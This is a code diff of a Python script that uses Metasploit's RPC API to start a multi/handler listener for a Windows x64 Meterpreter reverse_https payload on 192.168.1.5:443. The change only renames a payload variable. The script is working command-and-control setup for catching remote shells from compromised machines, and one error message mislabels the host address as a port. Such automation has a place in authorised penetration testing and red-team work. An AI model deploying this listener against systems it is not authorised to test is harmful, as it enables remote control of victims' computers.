@@ -10,13 +10,13 @@ def init(client):
     handler=''
     exploithandler = client.modules.use('exploit','multi/handler')
     exploithandler['ExitOnSession'] = False
-    httppl = client.modules.use('payload','windows/x64/meterpreter/reverse_https')
-    httppl['LHOST'] = '192.168.1.5'
-    httppl['LPORT'] = '443'
+    httpspl = client.modules.use('payload','windows/x64/meterpreter/reverse_https')
+    httpspl['LHOST'] = '192.168.1.5'
+    httpspl['LPORT'] = '443'
     print("[*] Setting up handler...")
     cid = client.consoles.console().cid
     #print(cid)
-    output = (client.consoles.console(cid).run_module_with_output_background(exploithandler, payload=httppl).split('['))
+    output = (client.consoles.console(cid).run_module_with_output_background(exploithandler, payload=httpspl).split('['))
     #print(output)
     #print(len(output))
     x=1
@@ -28,7 +28,7 @@ def init(client):
             fail = snippet.split('Exploit failed: ')
         x+=1
     if(len(fail)>1):
-        handler = "Handler failed to start..Is there a server using port {}?".format(httppl['LHOST'])
+        handler = "Handler failed to start..Is there a server using port {}?".format(httpspl['LHOST'])
     else:
         handler = "Handler started successfully"
     print("[+] " + handler)
